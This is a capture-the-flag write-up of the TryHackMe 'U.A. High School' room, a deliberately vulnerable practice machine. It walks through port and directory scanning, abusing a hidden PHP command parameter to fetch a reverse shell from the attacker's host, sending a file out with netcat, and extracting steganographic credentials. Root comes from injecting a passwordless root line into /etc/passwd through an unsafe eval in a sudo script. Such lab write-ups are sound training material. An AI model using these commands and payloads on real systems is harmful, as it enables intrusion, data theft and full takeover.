---
title: "TryHackMe - U.A. High School"
author: Nasrallah
description: ""
date: 2024-12-17 07:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, sudo, steganography, eval]
img_path: /assets/img/tryhackme/U.A. High School
image:
    path: highschool.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[U.A. High School](https://tryhackme.comr/r/room/yueiua) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) contains a hidden php file on a web server that we fuzz for parameters and find it executes os commands and we exploit that to get a shell. After that we find a passphrase that we use to extract a text file from an image and get a set of credentials of a user. The user can run a bash script as root that uses the eval function is an unsafe way that enable us to get root access.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.90.110
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 is OpenSSH running on Ubuntu and port 80 is Apache web server also running on Ubuntu.

### Web

Let's navigate to the web page.

![webpage](1.png)

Nothing really interesting in this page, and the website seems to be static.

#### Feroxbuster

Let's run a directory scan using `feroxbuster`.

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.52.164
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      313c http://10.10.52.164/assets => http://10.10.52.164/assets/
200      GET      166l      372w     2943c http://10.10.52.164/assets/styles.css
200      GET       71l      205w     2056c http://10.10.52.164/contact.html
200      GET       52l      320w     2542c http://10.10.52.164/about.html
200      GET       63l      287w     2573c http://10.10.52.164/admissions.html
200      GET       87l      261w     2580c http://10.10.52.164/courses.html
200      GET       61l      225w     1988c http://10.10.52.164/
200      GET       61l      225w     1988c http://10.10.52.164/index.html
200      GET        0l        0w        0c http://10.10.52.164/assets/index.php
301      GET        9l       28w      320c http://10.10.52.164/assets/images => http://10.10.52.164/assets/images/
[####################] - 50s    14184/14184   0s      found:10      errors:16     
[####################] - 37s     4724/4724    128/s   http://10.10.52.164/ 
[####################] - 37s     4724/4724    129/s   http://10.10.52.164/assets/ 
[####################] - 28s     4724/4724    166/s   http://10.10.52.164/assets/images/                
```

We found an `index.php` file on `/assets` directory. The file seems to be empty.

We can guess that the `index.php` takes some sort of parameter, so let's fuzz for that.

```bash
$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.52.164/assets/index.php?FUZZ=whoami -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.52.164/assets/index.php?FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

cmd                     [Status: 200, Size: 12, Words: 1, Lines: 1, Duration: 134ms]

```

We found the parameter `cmd`, Let's see what does it return

```bash
curl -s http://10.10.52.164/assets/index.php?cmd=id | base64 -d
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It return a base64 encoded string of the command output we run.

## **Foothold**

Let's get a reverse shell.

First I downloaded [ivan's php reverse shell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php).

I changed the ip address on the code to my tun0 ip address, then I served the file using python http server.

```bash
sudo python3 -m http.server 80
```

Now I used the cmd web shell we have on the target to upload the file.

```bash
curl -s http://10.10.52.164/assets/index.php?cmd=wget+http://10.14.91.207/shell.php
```

After that I setup my listener and requested the `shell.php`.

And now we request the shell.php file and get the shell.

```terminal
[★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.14.91.207] from (UNKNOWN) [10.10.52.164] 53268
SOCKET: Shell has connected! PID: 1742
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@myheroacademia:/var/www/html/assets$ export TERM=xterm
export TERM=xterm
www-data@myheroacademia:/var/www/html/assets$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌─[]─[10.14.91.207]─[sirius@parrot]─[~/ctf/www]
└──╼ [★]$ stty raw -echo; fg
nc -lvnp 9001

www-data@myheroacademia:/var/www/html/assets$ 
```

I used python pty to stabilize the shell.

## **Privilege Escalation**

Checking the web file we find a `Hidden_content` directory in `/var/www/` and it contains a passphrase.

```terminal
www-data@myheroacademia:/var/www$ cd Hidden_Content/
www-data@myheroacademia:/var/www/Hidden_Content$ ls
passphrase.txt
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt 
QWxsb[REDACTED]
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt |base64 -d
Allmi[REDACTED]
www-data@myheroacademia:/var/www/Hidden_Content$
```

I couldn't use the passphrase to change the any user.

Checking the website files again we find an image that it's not used in the website and just sitting there.

```terminal
www-data@myheroacademia:/var/www/html/assets/images$ ls -l
total 328
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
```

We download the image to our machine using the following commands:

```bash

# On our machine:
nc -lvnp 1234 > oneforall.jpg

# On target machine
nc -N {AttackerIP} 1234 < oneforall.jpg
```

When we try to open an image we get an error regarding the magic bytes.

> The magic bytes are simply the first bytes of a file which used to identify the file's type.
{: .prompt-info }

We can use `hexedit` to open the file and see the bytes.

```text
89 50 4E 47
```

With the help of this [wikipedia page](https://en.wikipedia.org/wiki/List_of_file_signatures) we can see that the bytes on this file does not match the jpg file bytes. `FF D8 FF E0 00 10 4A 46 49 46 00 01`

Let's fix the file by typing the bytes, we press `CTRL + x` to save the changes and press `Y`.

Now we can open the file.

Since we got a passphrase, let's see if there are any hidden file on this image.

```bash
[★]$ steghide --extract -sf oneforall.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".
```

It worked! And we got some user credentials that we can usee to ssh to the box.

Checking our privileges as the new user.

```terminal
eku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

We can run feedback bash script as root, let's see what id does.

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi

```

The scripts takes input from user and checks it for some special characters which could be used for command injection. It then uses eval command to print the feedback and then adds to `/var/log/feedback.txt`.

That use of eval is our way to get root because luckily for us, the symbol `>` is not in the filter which we could use to write to files like `/etc/passwd` or root ssh folder.

Let's construct the line we will be appending the the `/etc/passwd` file.

```terminal
evil::0:0:root:/root:/bin/bash >> /etc/passwd
```

This will create a new user account with root privileges.

Now let's run the sudo command and add our exploit.

```terminal
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
evil::0:0:root:/root:/bin/bash >> /etc/passwd
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ su evil
root@myheroacademia:/home/deku#
root@myheroacademia:/home/deku# id
uid=0(root) gid=0(root) groups=0(root)
```

And just like that we got root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References
